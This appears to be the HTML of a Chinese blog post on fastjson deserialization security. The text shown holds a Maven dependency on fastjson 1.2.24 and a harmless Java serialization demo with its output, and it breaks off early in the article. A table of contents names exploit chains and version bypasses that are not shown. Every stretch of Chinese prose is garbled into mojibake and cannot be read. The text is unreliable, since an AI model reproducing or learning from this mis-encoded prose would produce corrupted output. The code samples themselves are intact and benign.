<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="fastjsonååºåˆ—åŒ– fastjsonæ˜¯é˜¿é‡Œå·´å·´çš„å¼€æºJSONè§£æåº“ï¼Œå®ƒå¯ä»¥è§£æJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ä¸ºjsonå­—ç¬¦ä¸²ä»¬ï¼Œä¹Ÿå¯ä»¥ååºåˆ—åŒ–ä¸€ä¸ªjsonå­—ç¬¦ä¸²ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå…¶å®ä¹Ÿå°±æ˜¯å’Œjacksonå·®ä¸å¤šçš„ã€‚\nåŸºæœ¬è¿‡ç¨‹äº†è§£ åœ¨è¿™é‡Œå…ˆæ¥çœ‹jsonåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚\nå¯¼å…¥ä¾èµ–\n1 2 3 4 5 &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.24&lt;/version&gt; &lt;/dependency&gt; å¦‚ä¸‹å°±æ˜¯ä¸€ä¸ªç®€å•çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package fastjson; import com.alibaba.fastjson.JSON; public class Fastjson_Test{ public static void main(String[] args) { Person person = new Person(); person.setName(&#34;fupanc&#34;); person.setAge(1233); //åºåˆ—åŒ– System.out.println(&#34;=====åºåˆ—åŒ–=====&#34;); String json = JSON.toJSONString(person); System.out.println(json); //ååºåˆ—åŒ– System.out.println(&#34;=====ååºåˆ—åŒ–=====&#34;); Person person1 = JSON.parseObject(json,Person.class); System.out.println(person1.getName()); System.out.println(person1.getAge()); } } class Person { private String name; private int age; public Object object; public Person() { } // Getters and Setters public String getName() { return name; } public void setName(String name){ this.name = name; } public int getAge() { return age; } public void setAge(int age){ this.age = age; } } è¾“å‡ºä¸ºï¼š\n">
<title>fastjsonååºåˆ—åŒ–</title>

<link rel='canonical' href='https://fupanc-w1n.github.io/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/'>

<link rel="stylesheet" href="/scss/style.min.45e3de8c0814070cbaa5e985ce54bc3660dbcbfa7077926b65bdd229ae300803.css"><meta property='og:title' content="fastjsonååºåˆ—åŒ–">
<meta property='og:description' content="fastjsonååºåˆ—åŒ– fastjsonæ˜¯é˜¿é‡Œå·´å·´çš„å¼€æºJSONè§£æåº“ï¼Œå®ƒå¯ä»¥è§£æJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ä¸ºjsonå­—ç¬¦ä¸²ä»¬ï¼Œä¹Ÿå¯ä»¥ååºåˆ—åŒ–ä¸€ä¸ªjsonå­—ç¬¦ä¸²ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå…¶å®ä¹Ÿå°±æ˜¯å’Œjacksonå·®ä¸å¤šçš„ã€‚\nåŸºæœ¬è¿‡ç¨‹äº†è§£ åœ¨è¿™é‡Œå…ˆæ¥çœ‹jsonåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚\nå¯¼å…¥ä¾èµ–\n1 2 3 4 5 &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.24&lt;/version&gt; &lt;/dependency&gt; å¦‚ä¸‹å°±æ˜¯ä¸€ä¸ªç®€å•çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package fastjson; import com.alibaba.fastjson.JSON; public class Fastjson_Test{ public static void main(String[] args) { Person person = new Person(); person.setName(&#34;fupanc&#34;); person.setAge(1233); //åºåˆ—åŒ– System.out.println(&#34;=====åºåˆ—åŒ–=====&#34;); String json = JSON.toJSONString(person); System.out.println(json); //ååºåˆ—åŒ– System.out.println(&#34;=====ååºåˆ—åŒ–=====&#34;); Person person1 = JSON.parseObject(json,Person.class); System.out.println(person1.getName()); System.out.println(person1.getAge()); } } class Person { private String name; private int age; public Object object; public Person() { } // Getters and Setters public String getName() { return name; } public void setName(String name){ this.name = name; } public int getAge() { return age; } public void setAge(int age){ this.age = age; } } è¾“å‡ºä¸ºï¼š\n">
<meta property='og:url' content='https://fupanc-w1n.github.io/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/'>
<meta property='og:site_name' content='fupanc'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-04-15T22:53:06&#43;08:00'/><meta property='article:modified_time' content='2025-04-15T22:53:06&#43;08:00'/>
<meta name="twitter:title" content="fastjsonååºåˆ—åŒ–">
<meta name="twitter:description" content="fastjsonååºåˆ—åŒ– fastjsonæ˜¯é˜¿é‡Œå·´å·´çš„å¼€æºJSONè§£æåº“ï¼Œå®ƒå¯ä»¥è§£æJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ä¸ºjsonå­—ç¬¦ä¸²ä»¬ï¼Œä¹Ÿå¯ä»¥ååºåˆ—åŒ–ä¸€ä¸ªjsonå­—ç¬¦ä¸²ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå…¶å®ä¹Ÿå°±æ˜¯å’Œjacksonå·®ä¸å¤šçš„ã€‚\nåŸºæœ¬è¿‡ç¨‹äº†è§£ åœ¨è¿™é‡Œå…ˆæ¥çœ‹jsonåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚\nå¯¼å…¥ä¾èµ–\n1 2 3 4 5 &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.24&lt;/version&gt; &lt;/dependency&gt; å¦‚ä¸‹å°±æ˜¯ä¸€ä¸ªç®€å•çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package fastjson; import com.alibaba.fastjson.JSON; public class Fastjson_Test{ public static void main(String[] args) { Person person = new Person(); person.setName(&#34;fupanc&#34;); person.setAge(1233); //åºåˆ—åŒ– System.out.println(&#34;=====åºåˆ—åŒ–=====&#34;); String json = JSON.toJSONString(person); System.out.println(json); //ååºåˆ—åŒ– System.out.println(&#34;=====ååºåˆ—åŒ–=====&#34;); Person person1 = JSON.parseObject(json,Person.class); System.out.println(person1.getName()); System.out.println(person1.getAge()); } } class Person { private String name; private int age; public Object object; public Person() { } // Getters and Setters public String getName() { return name; } public void setName(String name){ this.name = name; } public int getAge() { return age; } public void setAge(int age){ this.age = age; } } è¾“å‡ºä¸ºï¼š\n">
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/123_hu_e29e335f2b79de0d.jpg" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ”‹</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">fupanc</a></h1>
            <h2 class="site-description">æˆ‘ä¸æˆ‘å‘¨æ—‹ä¹…ï¼Œå®åšæˆ‘</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/fupanc-w1n'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>æš—è‰²æ¨¡å¼</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#åŸºæœ¬è¿‡ç¨‹äº†è§£">åŸºæœ¬è¿‡ç¨‹äº†è§£</a>
      <ol>
        <li><a href="#è°ƒè¯•åˆ†æ">è°ƒè¯•åˆ†æ</a>
          <ol>
            <li><a href="#åºåˆ—åŒ–è¿‡ç¨‹">åºåˆ—åŒ–è¿‡ç¨‹</a></li>
            <li><a href="#ååºåˆ—åŒ–è¿‡ç¨‹">ååºåˆ—åŒ–è¿‡ç¨‹</a></li>
          </ol>
        </li>
        <li><a href="#typeå±æ€§è¯´æ˜">@typeå±æ€§è¯´æ˜</a></li>
        <li><a href="#è¡¥å……è¯´æ˜">è¡¥å……è¯´æ˜</a></li>
      </ol>
    </li>
    <li><a href="#åˆ©ç”¨é“¾å­¦ä¹ ">åˆ©ç”¨é“¾å­¦ä¹ </a>
      <ol>
        <li><a href="#fastjson1224">fastjson&lt;=1.2.24</a>
          <ol>
            <li><a href="#templatesimplé“¾">TemplatesImplé“¾</a></li>
            <li><a href="#jdbcrowsetimplé“¾">JdbcRowSetImplé“¾</a></li>
          </ol>
        </li>
        <li><a href="#1225fastjson1241">1.2.25&lt;=fastjson&lt;=1.2.41</a></li>
        <li><a href="#1242">1.2.42</a></li>
        <li><a href="#1243">1.2.43</a></li>
        <li><a href="#1244">1.2.44</a></li>
        <li><a href="#1245">1.2.45</a></li>
        <li><a href="#1247">1.2.47</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/java%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
                Javaå®‰å…¨
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">fastjsonååºåˆ—åŒ–</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2025-04-15</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    é˜…è¯»æ—¶é•¿: 9 åˆ†é’Ÿ
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="fastjsonååºåˆ—åŒ–">fastjsonååºåˆ—åŒ–
</h1><p>fastjsonæ˜¯é˜¿é‡Œå·´å·´çš„å¼€æºJSONè§£æåº“ï¼Œå®ƒå¯ä»¥è§£æJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ä¸ºjsonå­—ç¬¦ä¸²ä»¬ï¼Œä¹Ÿå¯ä»¥ååºåˆ—åŒ–ä¸€ä¸ªjsonå­—ç¬¦ä¸²ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå…¶å®ä¹Ÿå°±æ˜¯å’Œjacksonå·®ä¸å¤šçš„ã€‚</p>
<h2 id="åŸºæœ¬è¿‡ç¨‹äº†è§£">åŸºæœ¬è¿‡ç¨‹äº†è§£
</h2><p>åœ¨è¿™é‡Œå…ˆæ¥çœ‹jsonåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚</p>
<p>å¯¼å…¥ä¾èµ–</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>com.alibaba<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>fastjson<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>1.2.24<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¦‚ä¸‹å°±æ˜¯ä¸€ä¸ªç®€å•çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Person</span><span class="w"> </span><span class="n">person</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Person</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">person</span><span class="p">.</span><span class="na">setName</span><span class="p">(</span><span class="s">&#34;fupanc&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">person</span><span class="p">.</span><span class="na">setAge</span><span class="p">(</span><span class="n">1233</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//åºåˆ—åŒ–</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;=====åºåˆ—åŒ–=====&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">toJSONString</span><span class="p">(</span><span class="n">person</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">json</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//ååºåˆ—åŒ–</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;=====ååºåˆ—åŒ–=====&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Person</span><span class="w"> </span><span class="n">person1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">,</span><span class="n">Person</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">person1</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">person1</span><span class="p">.</span><span class="na">getAge</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">class</span> <span class="nc">Person</span><span class="w">  </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">object</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">Person</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Getters and Setters</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getName</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setName</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">getAge</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setAge</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">age</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¾“å‡ºä¸ºï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">=====åºåˆ—åŒ–=====
</span></span><span class="line"><span class="cl">{&#34;age&#34;:1233,&#34;name&#34;:&#34;fupanc&#34;}
</span></span><span class="line"><span class="cl">=====ååºåˆ—åŒ–=====
</span></span><span class="line"><span class="cl">fupanc
</span></span><span class="line"><span class="cl">1233
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œçš„è½¬æ¢è¿‡ç¨‹å…¶å®æ˜¯å’Œjacksonå·®ä¸å¤šçš„ï¼Œéƒ½æ˜¯è°ƒç”¨çš„getterå’Œsetteræ¥è¿›è¡Œçš„å–å€¼ä¸èµ‹å€¼ã€‚</p>
<ul>
<li>@JSONFieldæ³¨è§£</li>
</ul>
<p>ä¸çŸ¥é“æœ‰æ²¡æœ‰ç”¨ï¼Œå…ˆç®€å•äº†è§£ä¸€ä¸‹ï¼Œé€šè¿‡è¿™ä¸ªæ³¨è§£ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰å­—æ®µçš„åç§°çš„è¾“å‡ºï¼Œå¦‚ä¸‹demoï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
